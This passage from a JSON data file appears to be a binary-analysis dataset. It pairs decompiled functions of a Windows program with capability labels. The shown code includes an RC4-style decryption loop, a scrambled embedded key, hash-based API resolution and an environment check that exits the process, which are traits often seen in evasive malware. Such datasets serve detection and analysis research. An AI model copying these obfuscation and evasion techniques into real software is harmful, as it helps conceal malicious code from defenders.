_sym.imp.KERNEL32.dll_GlobalLock;\n        if (iVar4 == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(*(param_1 + 0x10));\n            (*pcVar2)(uVar5);\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar6);\n            fcn.00414000();\n        }\n        iVar6 = (*pcVar2)(iVar4);\n        fcn.004079b0(iVar6 + *(param_1 + 4) * 8, 0, (*(param_1 + 4) * 0x1fffffff + iVar7) * 8);\n        *(param_1 + 0x10) = iVar6;\n        *(param_1 + 4) = iVar7;\n    }\ncode_r0x0041b0cd:\n    if (*(param_1 + 0xc) <= iVar8) {\n        *(param_1 + 0xc) = iVar8 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar8 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar8 + 1;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n    return iVar8;\n}\n",
        "token_count": 709
    },
    "0040167e": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_214h\n// WARNING: Removing unreachable block (ram,0x0040188d)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040167e(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    uint32_t var_214h;\n    uint32_t var_210h;\n    int32_t var_20ch;\n    uint var_208h;\n    uint var_108h;\n    uint32_t var_104h;\n    uint var_100h;\n    \n    var_214h = 0;\n    for (var_210h = 0; var_210h < 0x100; var_210h = var_210h + 1) {\n        *(&var_100h + var_210h) = var_210h;\n        *(&var_208h + var_210h) = *(arg_10h + var_210h % arg_14h);\n    }\n    for (var_210h = 0; var_210h < 0x100; var_210h = var_210h + 1) {\n        var_214h = var_214h + *(&var_100h + var_210h) + *(&var_208h + var_210h) & 0x800000ff;\n        if (var_214h < 0) {\n            var_214h = (var_214h - 1 | 0xffffff00) + 1;\n        }\n        uVar1 = *(&var_100h + var_214h);\n        *(&var_100h + var_214h) = *(&var_100h + var_210h);\n        *(&var_100h + var_210h) = uVar1;\n    }\n    var_214h = 0;\n    for (var_20ch = 0; var_20ch < arg_ch; var_20ch = var_20ch + 1) {\n        var_210h = var_210h + 1 & 0x800000ff;\n        if (var_210h < 0) {\n            var_210h = (var_210h - 1 | 0xffffff00) + 1;\n        }\n        var_214h = var_214h + *(&var_100h + var_210h) & 0x800000ff;\n        if (var_214h < 0) {\n            var_214h = (var_214h - 1 | 0xffffff00) + 1;\n        }\n        var_108h._0_1_ = *(&var_100h + var_214h);\n        *(&var_100h + var_214h) = *(&var_100h + var_210h);\n        *(&var_100h + var_210h) = var_108h;\n        var_104h = *(&var_100h + var_210h) + *(&var_100h + var_214h) & 0x800000ff;\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4235c4);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423614);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423664);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4236b4);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423704);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423754);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4237a4);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4237f4);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423844);\n        fcn.004059e0(pcVar2);\n        pcVar2 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423894);\n        fcn.004059e0(pcVar2);\n        fcn.00406070(0x430248, 0x4238e4, fcn.00405890);\n        fcn.004059e0(var_214h);\n        *(arg_18h + var_20ch) = *(arg_8h + var_20ch) ^ *(&var_100h + var_104h);\n    }\n    return;\n}\n",
        "token_count": 1237
    },
    "00405a00": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.00405a00(uint param_1, uint8_t param_2)\n\n{\n    char cVar1;\n    uint32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_14h;\n    uchar *puStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bd29;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    puStack20 = &stack0xffffffb4;\n    var_14h = 0;\n    fcn.00405cd0(param_1);\n    var_4h = 0;\n    cVar1 = fcn.00405d30();\n    if (cVar1 == '\\0') {\n        var_14h = var_14h | 4;\n    }\n    else {\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        fcn.00405c40();\n        var_20h = fcn.00405d60(extraout_ECX & 0xffffff00 | var_8h);\n        var_24h = fcn.00405b50();\n        cVar1 = fcn.00405b30(&var_24h, &var_20h);\n        if (cVar1 != '\\0') {\n            var_14h = var_14h | 4;\n        }\n        var_4h = 0;\n    }\n    fcn.00405c10(var_14h, 0);\n    var_4h = 0xffffffff;\n    fcn.00405d00();\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 479
    },
    "00405b60": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405b60(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    cVar1 = fcn.00405bd0();\n    if (cVar1 == '\\0') {\n        fcn.00405c40();\n        iVar2 = fcn.00405d40();\n        if (iVar2 == -1) {\n            var_4h = 4;\n        }\n    }\n    fcn.00405c10(var_4h, 0);\n    return param_1;\n}\n",
        "token_count": 145
    },
    "00405d00": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00405d00(uint param_1)\n\n{\n    char cVar1;\n    uint var_4h;\n    \n    cVar1 = fcn.0040e0b0(param_1);\n    if (cVar1 == '\\0') {\n        fcn.00405fc0();\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "00405f30": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00405f30(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    cVar1 = fcn.00405fa0(param_1);\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.00406010();\n        if (iVar2 != 0) {\n            fcn.00406010();\n            fcn.00405b60();\n        }\n    }\n    fcn.00405fa0(param_1);\n    return;\n}\n",
        "token_count": 139
    },
    "00406070": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406070(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5dh;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_14h;\n    uchar *puStack20;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bd49;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    puStack20 = &stack0xffffff80;\n    var_14h = 0;\n    var_24h = fcn.00406330(var_ch);\n    iVar3 = fcn.00406350();\n    if ((iVar3 < 1) || (uVar4 = fcn.00406350(),  uVar4 <= var_24h)) {\n        var_3ch = 0;\n    }\n    else {\n        var_3ch = fcn.00406350();\n        var_3ch = var_3ch - var_24h;\n    }\n    var_20h = var_3ch;\n    fcn.00405cd0(var_8h);\n    var_4h = 0;\n    cVar1 = fcn.00405d30();\n    if (cVar1 == '\\0') {\n        var_14h = var_14h | 4;\n    }\n    else {\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        uVar4 = fcn.00405ff0();\n        if ((uVar4 & 0x1c0) != 0x40) {\n            for (; var_20h != 0; var_20h = var_20h + -1) {\n                uVar2 = fcn.004063d0();\n                uVar4 = fcn.00405c40();\n                var_28h = fcn.00405d60(uVar4 & 0xffffff00 | uVar2);\n                var_2ch = fcn.00405b50();\n                cVar1 = fcn.00405b30(&var_2ch, &var_28h);\n                if (cVar1 != '\\0') {\n                    var_14h = var_14h | 4;\n                    break;\n                }\n            }\n        }\n        if (var_14h == 0) {\n            fcn.00405c40();\n            uVar4 = fcn.004063f0(var_ch, var_24h);\n            if (uVar4 != var_24h) {\n                var_14h = var_14h | 4;\n            }\n        }\n        if (var_14h == 0) {\n            for (; var_20h != 0; var_20h = var_20h + -1) {\n                uVar2 = fcn.004063d0();\n                uVar4 = fcn.00405c40();\n                var_30h = fcn.00405d60(uVar4 & 0xffffff00 | uVar2);\n                var_34h = fcn.00405b50();\n                cVar1 = fcn.00405b30(&var_34h, &var_30h);\n                if (cVar1 != '\\0') {\n                    var_14h = var_14h | 4;\n                    break;\n                }\n            }\n        }\n        fcn.00406370(0);\n        var_4h = 0;\n    }\n    fcn.00405c10(var_14h, 0);\n    var_4h = 0xffffffff;\n    fcn.00405d00();\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 1023
    },
    "00419abb": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00419abb(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00401a16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401a16(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    \n    var_2ch = 0;\n    var_34h = 0;\n    var_30h = 0x42de10;\n    if (*0x42de10 == NULL) {\n        var_2ch = 0;\n    }\n    else if (*0x42de14 == 0) {\n        var_2ch = 0;\n    }\n    else {\n        var_44h = 10;\n        var_40h = arg_8h;\n        var_3ch = 0x407;\n        var_38h = (**0x42de10)(0x400000, &var_44h, 3, &var_28h);\n        if (((-1 < var_38h) && (iVar1 = (**(var_30h + 4))(0x400000, var_28h, &var_2ch, &var_34h),  -1 < iVar1)) &&\n           (arg_ch != NULL)) {\n            *arg_ch = var_34h;\n        }\n    }\n    return var_2ch;\n}\n",
        "token_count": 323
    },
    "00401b9d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401b9d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    \n    var_28h = 0x42de10;\n    var_30h = 0;\n    while( true ) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"advapi32.dll\", 0, 0);\n        uVar1 = fcn.0040140f(uVar1, var_30h + -0x2d37e436);\n        *(var_28h + 0x20) = uVar1;\n        var_2ch = 0;\n        if (*(var_28h + 0x20) != 0) break;\n        var_30h = var_30h + 1;\n    }\n    iVar2 = (**(var_28h + 0x20))(&var_2ch, 0, 0, 1, 0);\n    if (iVar2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = (**(var_28h + 0x20))(&var_2ch, 0, 0, 1, 8);\n        if (iVar2 == 0) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 349
    },
    "00401c3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401c3c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    code *pcVar5;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    code *var_90h;\n    code *var_8ch;\n    uint var_88h;\n    uint var_84h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bcc8;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004156f8();\n    var_10h = fcn.00405e60(0);\n    if (var_10h != 0) {\n        fcn.00405860();\n        var_4h = 0;\n        fcn.004188d7(0x65);\n        iVar1 = fcn.004058b0();\n        if (iVar1 == 0) {\n            fcn.00405c60(0x800, 0, 0);\n            uVar2 = fcn.004058f0();\n            fcn.00405c60(0, 0x10, uVar2);\n        }\n        iVar1 = fcn.00401b9d();\n        if (iVar1 != 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0xfffd7571);\n        }\n        var_3ch = 0x42de10;\n        puVar3 = \"1Pu@zR}zmixOtoCtYD9TxWElGL872fxweylJk7aTy2XeJ7mw3PfVHNoLmGM7WDZxI~7\";\n        puVar4 = &var_84h;\n        for (iVar1 = 0x11; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        fcn.00401ab0();\n        var_94h = 0;\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423994);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4239e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423a34);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423a84);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423ad4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423b24);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423b74);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423bc4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423c14);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423c64);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423cb4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423d04);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423d54);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423da4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423df4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423e44);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423e94);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423ee4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423f34);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423f84);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x423fd4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424024);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424074);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4240c4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424114);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424164);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4241b4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424204);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424254);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4242a4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4242f4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424344);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424394);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4243e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424434);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424484);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4244d4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424524);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424574);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4245c4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424614);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424664);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4246b4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424704);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424754);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4247a4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4247f4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424844);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424894);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4248e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424934);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424984);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4249d4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424a24);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424a74);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424ac4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424b14);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424b64);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424bb4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424c04);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424c54);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424ca4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424cf4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424d44);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424d94);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424de4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424e34);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424e84);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424ed4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424f24);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424f74);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x424fc4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425014);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425064);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4250b4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425104);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425154);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4251a4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4251f4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425244);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425294);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4252e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425334);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425384);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4253d4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425424);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425474);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4254c4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425514);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425564);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4255b4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425604);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425654);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4256a4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4256f4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425744);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425794);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4257e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425834);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425884);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4258d4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425924);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425974);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x4259c4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425a14);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425a64);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425ab4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425b04);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425b54);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425ba4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425bf4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425c44);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425c94);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425ce4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425d34);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425d84);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425dd4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425e24);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425e74);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425ec4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x425f14);\n        